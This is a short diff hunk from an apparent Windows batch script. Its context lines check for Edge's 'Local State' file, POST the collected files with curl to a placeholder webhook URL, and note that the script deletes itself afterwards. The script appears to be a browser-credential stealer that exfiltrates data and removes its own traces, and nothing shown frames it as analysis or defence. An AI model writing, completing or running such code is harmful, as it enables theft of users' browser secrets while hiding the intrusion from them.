@@ -28,6 +28,7 @@ if exist "%LocalAppData%\Microsoft\Edge\User Data\Local State" (
 
 curl -X POST -H "Content-Type: multipart/form-data" ^
      !files_to_upload! ^
+
      [WEBHOOK URL]  
 
 REM Deletes the bat file from computer
